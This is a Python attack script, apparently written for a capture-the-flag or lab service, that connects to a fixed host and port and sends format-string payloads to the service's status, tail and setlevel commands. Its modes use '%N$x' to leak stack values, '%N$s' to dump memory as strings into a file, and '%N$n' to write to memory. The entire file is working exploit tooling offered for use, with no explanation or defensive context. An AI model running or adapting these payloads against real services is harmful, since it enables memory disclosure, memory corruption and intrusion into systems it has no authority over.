import socket
import time
import sys

HOST = "10.13.37.10"
PORT = 20550

def recv_all(s, timeout=1.5):
    s.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        pass
    return b"".join(chunks)

def session(commands, rawfile=None):
    s = socket.create_connection((HOST, PORT), timeout=5)
    print("--- banner ---")
    print(recv_all(s).decode(errors='replace'))
    all_resp = b""
    for cmd in commands:
        print(f">>> {cmd!r}")
        s.sendall((cmd + "\n").encode())
        resp = recv_all(s)
        all_resp += resp
        print(resp.decode(errors='replace'))
    s.close()
    if rawfile:
        with open(rawfile, "wb") as f:
            f.write(all_resp)
        print("raw saved to", rawfile, "len", len(all_resp))

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "scan":
        lo, hi = int(sys.argv[2]), int(sys.argv[3])
        fmt = " ".join(f"{i}:%{i}$x" for i in range(lo, hi + 1))
        session(["status", fmt])
    elif len(sys.argv) > 1 and sys.argv[1] == "tailscan":
        lo, hi = int(sys.argv[2]), int(sys.argv[3])
        fmt = " ".join(f"{i}:%{i}$x" for i in range(lo, hi + 1))
        session(["tail", fmt, "exit"])
    elif len(sys.argv) > 1 and sys.argv[1] == "tails":
        idxs = [int(x) for x in sys.argv[2:]]
        fmt = " ".join(f"{i}:[%{i}$s]" for i in idxs)
        session(["tail", fmt, "exit"], rawfile="/tmp/syslog_raw.bin")
    elif len(sys.argv) > 1 and sys.argv[1] == "nwrite":
        idx = int(sys.argv[2])
        fmt = f"probe %{idx}$n done"
        session(["status", fmt])
    elif len(sys.argv) > 1 and sys.argv[1] == "levelscan":
        lo, hi = int(sys.argv[2]), int(sys.argv[3])
        fmt = " ".join(f"{i}:%{i}$x" for i in range(lo, hi + 1))
        session(["setlevel", fmt])
    elif len(sys.argv) > 1 and sys.argv[1] == "scans":
        # try %N$s on given indices
        idxs = [int(x) for x in sys.argv[2:]]
        fmt = " ".join(f"{i}:[%{i}$s]" for i in idxs)
        session(["status", fmt], rawfile="/tmp/syslog_raw.bin")
    else:
        cmds = sys.argv[1:] if len(sys.argv) > 1 else ["status", "hello"]
        session(cmds)
